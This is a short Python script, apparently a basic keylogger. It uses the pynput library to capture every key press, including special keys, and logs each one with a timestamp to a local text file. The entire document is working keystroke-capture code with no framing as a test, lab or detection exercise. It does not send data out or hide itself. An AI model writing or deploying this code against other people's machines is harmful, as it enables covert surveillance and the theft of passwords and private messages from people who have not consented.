from pynput import keyboard
import logging

# Set up log file location
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log each key press
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
